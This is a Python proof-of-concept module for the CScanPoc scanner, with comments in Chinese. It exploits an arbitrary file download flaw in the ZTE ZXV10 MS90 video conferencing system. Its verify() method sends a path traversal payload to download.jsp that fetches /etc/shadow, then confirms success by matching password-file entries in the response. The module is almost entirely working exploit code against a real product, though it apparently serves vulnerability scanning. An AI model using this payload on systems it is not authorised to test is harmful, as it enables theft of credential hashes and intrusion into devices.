# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse

class Vuln(ABVuln):
    vuln_id = 'ZTE_0001'  # 平台漏洞编号，留空
    name = '中兴ZXV10 MS90 远程视频会议系统任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-10-31'  # 漏洞公布时间
    desc = '''
        中兴ZXV10 MS90 远程视频会议系统任意文件下载：conf_control/download.jsp?filename=dd.txt&filePath=/../../../../etc/shadow
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'ZTE'  # 漏洞应用名称
    product_version = '中兴ZXV10 MS90'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '1e2311fe-4757-46d5-90f4-ea4ac11091d6'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #refer:http://www.wooyun.org/bugs/wooyun-2014-081469
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = '/conf_control/download.jsp?filename=dd.txt&filePath=/../../../../etc/shadow'
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)
            if 'root:' in res and 'ppc:' in res:
                #security_hole('中兴ZXV10 MS90 远程视频会议系统任意文件下载'+target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
